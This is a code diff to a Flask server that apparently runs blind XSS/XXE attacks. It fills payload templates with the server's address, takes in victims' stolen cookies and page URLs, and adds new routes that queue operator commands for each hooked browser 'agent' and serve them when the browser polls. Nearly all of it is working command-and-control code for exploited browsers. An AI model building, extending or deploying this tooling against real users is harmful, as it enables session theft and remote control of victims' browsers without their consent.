@@ -3,7 +3,7 @@
 from flask import Blueprint, render_template, request, send_from_directory, flash
 from flask_login import login_required
 from . import db, config
-from .models import XSS
+from .models import XSS, Interact
 import uuid
 from datetime import datetime
 import json
@@ -78,11 +78,14 @@ def new_xxx(xxx, random_str):
         
         fin = open(current_dir + path + new_file, "rt")
         data = fin.read()
+
         data = data.replace('{{IP}}', config["unblind_url"])
         data = data.replace('{{PORT}}', config["unblind_port"])
-        data = data.replace('{{INFO_ENDPOINT}}', config["stage_2_endpoint"])
-       
+        data = data.replace('{{ENDPOINT_INIT}}', config["main_endpoint"] + config["stage_2_init_endpoint"])
+        data = data.replace('{{ENDPOINT_INTERACT}}', config["main_endpoint"] + config["stage_2_interact_endpoint"])
+        data = data.replace('{{DELAY}}', config["stage_2_delay_cmd"])
         data = data.replace('{{UID}}', xss_uid)
+
         fin.close()
         fin = open(current_dir + path + new_file, "wt")
         fin.write(data)
@@ -99,7 +102,7 @@ def new_xxx(xxx, random_str):
         return ""
 
 # grab cookie, url, user-agent uid after stage_2
-@main.route(config["main_endpoint"] + config["stage_2_endpoint"] + '/<path:xxx_uid>', methods=['POST'])
+@main.route(config["main_endpoint"] + config["stage_2_init_endpoint"] + '/<path:xxx_uid>', methods=['POST'])
 def grab_info(xxx_uid):
     # POST's content is a json base64 encoded
     #{url': 'url', 'cookie': 'cookie'} = eyJ1aWQiOiAiMTIzNDUiLCAidXJsIjogInVybCIsICJjb29raWUiOiAiY29va2llIn0=
@@ -145,7 +148,79 @@ def grab_info(xxx_uid):
         print(str(e))
         print("[-] Error_2 in get_info()")
         return ""
-        
+
+# stage 2 send cmd
+@main.route(config["main_endpoint"] + config["stage_2_cmd_endpoint"] + '/<path:xxx_uid>', methods=['POST'])
+def send_cmd(xxx_uid):
+    if xxx_uid == "":
+        return render_template('index.html')
+
+    try:
+        content = request.data 
+        info = content
+        #info = urlsafe_b64decode(content)
+        info = str(info, "utf-8")
+        info = json.loads(info)
+
+        xss_uid = str(xxx_uid)
+        cmd = str(info["c"])
+        print(cmd)
+        print(xss_uid)
+    except Exception as e:
+        print(str(e))
+        print("[-] Error_1 in send_cmd()")
+        return render_template('index.html')
+
+    try:
+        xxx = XSS.query.filter_by(xss_uid=xss_uid).first()
+        if xxx:
+            interact = Interact.query.filter_by(agent_uid=xss_uid).first()
+            if interact: # update it
+                interact.agent_uid = xss_uid
+                interact.agent_cmd = cmd
+                interact.agent_response = ""
+                db.session.commit()
+            else: # create the entry
+                new_interact = Interact(agent_uid=xss_uid, agent_cmd=cmd, agent_response="")
+                db.session.add(new_interact)
+                db.session.commit()
+
+            print("[+] cmd inserted inside the db: " + cmd)
+            return render_template('unblind.html')
+        else:
+            print("[-] try to insert cmd inside the db")
+            return render_template('unblind.html')
+
+    except Exception as e:
+        print(str(e))
+        print("[-] Error_2 in send_cmd()")
+        return render_template('unblind.html')
+
+
+
+# stage 2 interaction
+@main.route(config["main_endpoint"] + config["stage_2_interact_endpoint"] + '/<path:xxx_uid>', methods=['GET'])
+def interact(xxx_uid):
+    if xxx_uid == "":
+        return render_template('index.html')
+
+    xss_uid = str(xxx_uid)
+
+    #r = {"r": "alert(1)"}
+    # check inside the db if there is a cmd for this agent
+    interact = Interact.query.filter_by(agent_uid=xss_uid).first()
+    if interact:  # if exist inside the db, get the command from the db
+        r = {"r": interact.agent_cmd}
+        #then refresh the cmd inside the db
+        interact.agent_cmd = ""
+        db.session.commit()
+    else: 
+        r = {"r": ""}
+
+    return r
+
+
+
 # delete xss/xxe
 @main.route(config["main_endpoint"] + '/<path:xxx>/<path:xxx_uid>', methods=['DELETE'])
 @login_required
